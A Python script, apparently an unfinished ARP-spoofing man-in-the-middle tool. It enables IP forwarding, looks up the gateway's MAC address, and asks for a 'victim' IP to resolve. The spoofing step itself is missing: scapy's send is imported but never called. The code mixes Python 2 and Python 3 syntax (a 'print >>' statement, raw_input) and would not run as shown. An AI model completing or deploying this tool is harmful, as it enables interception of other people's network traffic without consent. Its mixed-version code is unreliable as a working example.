from scapy.all import Ether, ARP, srp, send #The library we'll be using for ARP spoofing (python -m pip install scapy)
import netifaces #A library for getting the network interfaces (python -m pip install netifaces)
import argparse
import time
import os
import sys

def getMAC(ip): #returns MAC address of device connected to the network
	result, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
	if result:
		return result[0][1].src
	else:
		return "None" #Device wasn't found

def main():
	print("Python MITM has booted.")
	print("Enabling IP forwarding...")
	ipForwardFilePath = "/proc/sys/net/ipv4/ip_forward"
	with open(ipForwardFilePath) as f:
		if f.readline(1) == "1": #Checks if IP forwarding is already enabled
			print("IP forwarding already enabled.") 
		else:
			with open(ipForwardFilePath, "w") as _f:
				print >>_f, 1 #Enables IP forwarding

	print("Getting default network interface...")
	gws=netifaces.gateways() #Retrieve the gateways for the network interfaces
	defaultGateway = gws["default"][netifaces.AF_INET] #Select the default gateway
	gatewayMAC = getMAC(defaultGateway[0]) #Get the mac address of the default gateway
	#defaultGatway[0] = IP address
	#defaultGateway[1] = Interface
	print("Gateway address {} for interface {} detected.".format(defaultGateway[0], defaultGateway[1]));
	print("MAC address of the gateway is {}.".format(gatewayMAC))
	ip = raw_input("Enter IP address to spoof: ") #Request input for the victim's IP
	
	victimMAC = getMAC(ip) #Get the MAC address of the victim
	if victimMAC == "None":
		print("Network device for IP {} could not be found.".format(ip))
		return
	else:
		print("MAC is {}".format(victimMAC))



#Runs the main function if this script is executed as the main program
if __name__ == "__main__":
	main()